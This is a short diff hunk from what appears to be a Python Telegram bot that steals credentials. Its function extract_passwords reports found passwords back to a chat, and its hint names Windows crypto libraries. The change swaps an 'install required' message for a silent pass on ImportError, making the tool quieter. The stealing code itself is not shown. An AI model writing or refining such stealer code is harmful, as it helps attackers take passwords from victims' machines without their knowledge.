@@ -790,7 +790,7 @@ def extract_passwords(message: telebot.types.Message) -> None:
         else:
             bot.send_message(message.chat.id, "No passwords found")
     except ImportError:
-        bot.send_message(message.chat.id, "Install required: pip install pypiwin32 pycryptodome")
+        pass
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {str(e)[:200]}")
 
